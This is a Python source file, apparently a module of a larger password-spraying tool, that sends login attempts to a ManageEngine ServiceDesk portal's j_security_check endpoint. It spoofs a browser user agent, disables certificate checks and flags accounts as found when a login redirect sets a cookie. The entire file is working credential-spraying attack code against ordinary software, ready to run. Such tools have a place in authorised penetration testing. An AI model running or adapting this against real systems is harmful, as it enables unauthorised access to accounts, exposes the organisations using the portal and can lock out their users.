#!/usr/bin/env python3

"""Functionality to spray Manage Engine ServiceDesk portal"""

import warnings

import requests
# This is to suppress the insecure warning. If there is a better way please let me know
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore', InsecureRequestWarning)

def me_conn(params):

    username = params.get("username")
    password = params.get("password")
    host = params.get("host")
    count = params.get("count")
    place = params.get("place")
    filelogger = params.get("filelogger")
    domain = params.get("domain")
    origin = f"https://{host}"
    originreferrer = f"https://{host}/js_security_check"
    meurl = f"https://{host}/j_security_check"

    headers = {
        'Host': host,
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': origin,
        'Connection': 'close',
        'Referer': originreferrer,
        'Upgrade-Insecure-Requests': '1'
    }

    data = {
        "AUTHRULE_NAME": "SDRelationalLoginModule",
        "j_username": username,
        "j_password": password,
        "domain": "1",
        "dname": "0",
        "DOMAIN_NAME": str(domain).upper(),
        "LDAPEnable": "false",
        "AdEnable": "true",
        "enableDomainDropdown": "true",
        "DomainCount": "0",
        "LocalAuth": "No",
        "LocalAuthWithDomain": str(domain).upper(),
        "dynamicUserAddition_status": "true",
        "localAuthEnable": "true",
        "logonDomainName": str(domain).upper(),
        "loginButton": ""
    }

    print(f"ACCOUNT CHECK: [MANAGEENGINE] Target: {host} User: {username} [{place} of {count}, {place} completed] Password: {password}")
    try:
        # print the host , username and password being checked
        query = requests.post(meurl, data=data, headers=headers,
                              allow_redirects=True, verify=False)
    except Exception as e:
        print(f"ERROR: {e}")
    else:
        # print(f"{query.status_code}:{len(query.content)}:{query.is_redirect}:{query.url}")
        for resp in query.history:
            # print(f"{resp.status_code}:{len(resp.content)}:{resp.url}")
            if resp.headers['Set-Cookie']:
                print(f"ACCOUNT FOUND: [MANAGEENGINE] Target: {host} User: {username} Password: {password} [SUCCESS]")

                if filelogger:
                    filelogger.debug(f"ACCOUNT FOUND: [MANAGEENGINE] Target: {host} User: {username} Password: {password} [SUCCESS]")
